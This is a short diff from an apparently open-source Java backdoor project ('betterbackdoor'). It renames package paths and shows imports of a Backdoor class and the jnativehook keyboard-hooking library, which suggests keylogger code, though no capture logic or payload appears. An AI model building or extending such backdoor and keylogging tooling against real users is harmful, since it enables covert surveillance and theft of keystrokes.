@@ -1,10 +1,10 @@
-package com.github.thatcherdev.betterbackdoor.backend;
+package com.thatcherdev.betterbackdoor.backend;
 
 import java.io.BufferedWriter;
 import java.io.FileWriter;
 import java.io.PrintWriter;
 
-import com.github.thatcherdev.betterbackdoor.backdoor.Backdoor;
+import com.thatcherdev.betterbackdoor.backdoor.Backdoor;
 
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.keyboard.NativeKeyEvent;
